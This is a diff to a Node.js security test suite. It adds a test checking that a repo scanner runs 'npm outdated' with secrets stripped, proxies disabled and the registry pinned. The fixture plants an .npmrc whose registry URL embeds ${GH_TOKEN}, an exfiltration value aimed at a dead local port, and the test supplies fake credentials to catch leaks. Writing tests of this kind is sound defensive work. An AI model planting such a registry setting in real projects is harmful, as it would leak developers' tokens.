@@ -1,4 +1,4 @@
-// Scans never run a program named in a repo's own git config (audit 2026-11-09, B1-B3).
+// Scans never run a program named in a repo's own git config (audit 2026-11-09, B1-B4).
 // Each attack writes a marker file when its program runs; the scan must leave no marker.
 const test = require('node:test');
 const assert = require('node:assert');
@@ -139,6 +139,36 @@ test('B3: the tests scan\'s git blame does not run a textconv driver, and still 
   const t = await scanTests(d);
   assert.equal(m.ran(), false, 'textconv ran from scanTests');
   assert.ok(t.upkeep, 'scanTests completed');
+});
+
+test('B4: npm outdated gets a scrubbed environment and a pinned registry', async () => {
+  const d = repo({ 'package.json': JSON.stringify({ dependencies: { leftpad: '1.0.0' } }), '.npmrc': 'registry=http://127.0.0.1:9/leak/${GH_TOKEN}/\n' });
+  fs.mkdirSync(path.join(d, 'node_modules'));
+  const bin = path.join(ROOT, `bin${++n}`);
+  const out = path.join(ROOT, `npm-env${n}`);
+  fs.mkdirSync(bin);
+  fs.writeFileSync(path.join(bin, 'npm'), `#!/bin/sh\nenv > '${out}'\necho "ARGS $*" >> '${out}'\necho '{}'\n`, { mode: 0o755 });
+  const saved = { PATH: process.env.PATH, GH_TOKEN: process.env.GH_TOKEN, AWS_SECRET_ACCESS_KEY: process.env.AWS_SECRET_ACCESS_KEY, npm_config_registry: process.env.npm_config_registry, HTTPS_PROXY: process.env.HTTPS_PROXY };
+  Object.assign(process.env, { PATH: `${bin}:${process.env.PATH}`, GH_TOKEN: 'gh-secret-x', AWS_SECRET_ACCESS_KEY: 'aws-secret-x', npm_config_registry: 'http://127.0.0.1:9/', HTTPS_PROXY: 'http://127.0.0.1:9/' });
+  try {
+    await collectLocal(d, { deep: true });
+  } finally {
+    for (const [k, v] of Object.entries(saved)) { if (v === undefined) delete process.env[k]; else process.env[k] = v; }
+  }
+  const env = Object.fromEntries(fs.readFileSync(out, 'utf8').split('\n').filter((l) => l.includes('=') && !l.startsWith('ARGS')).map((l) => [l.slice(0, l.indexOf('=')), l.slice(l.indexOf('=') + 1)]));
+  assert.match(fs.readFileSync(out, 'utf8'), /ARGS outdated --json/);
+  for (const k of ['GH_TOKEN', 'AWS_SECRET_ACCESS_KEY', 'HTTPS_PROXY', 'GIT_CONFIG_GLOBAL']) assert.equal(env[k], undefined, `${k} reached npm`);
+  assert.ok(!Object.values(env).some((v) => v.includes('secret-x')), 'a secret value reached npm');
+  assert.equal(env.npm_config_registry, 'https://registry.npmjs.org/');
+  // `false`, not empty: npm ignores an empty env value and would take the proxy from the .npmrc.
+  for (const k of ['npm_config_proxy', 'npm_config_https_proxy']) assert.equal(env[k], 'false', k);
+  assert.equal(env.npm_config_ignore_scripts, 'true');
+  assert.equal(env.npm_config_logs_max, '0');
+  assert.equal(env.npm_config_update_notifier, 'false');
+  assert.equal(env.npm_config_fund, 'false');
+  assert.equal(env.npm_config_audit, 'false');
+  assert.equal(env.HOME, HOME);
+  assert.ok(env.PATH.startsWith(bin));
 });
 
 test('READONLY_GIT carries the fixed hardening options', () => {
